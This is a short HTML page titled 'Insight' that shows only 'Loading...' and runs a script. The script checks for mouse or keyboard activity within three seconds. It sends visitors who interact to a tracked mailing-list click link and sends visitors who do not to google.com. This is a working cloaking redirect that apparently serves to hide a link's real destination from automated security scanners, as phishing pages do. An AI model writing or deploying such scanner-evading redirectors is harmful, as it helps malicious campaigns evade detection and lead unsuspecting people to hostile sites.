<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Insight</title>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const isHuman = () => {
        // Check for mouse or keyboard interaction
        return new Promise((resolve) => {
          let interacted = false;

          const interactionListener = () => {
            interacted = true;
            resolve(true);
            window.removeEventListener("mousemove", interactionListener);
            window.removeEventListener("keydown", interactionListener);
          };

          window.addEventListener("mousemove", interactionListener);
          window.addEventListener("keydown", interactionListener);

          // Timeout to decide if no interaction means bot
          setTimeout(() => {
            if (!interacted) resolve(false);
          }, 3000);
        });
      };

      isHuman().then((human) => {
        if (human) {
          // Redirect human users to the main page
          window.location.href = "https://semi-zcmp.maillist-manage.com/click/1134d1b69885462df/1134d1b6988545f27";
        } else {
          // Redirect bots or non-interactive visitors to another URL
          window.location.href = "https://www.google.com";
        }
      });
    });
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
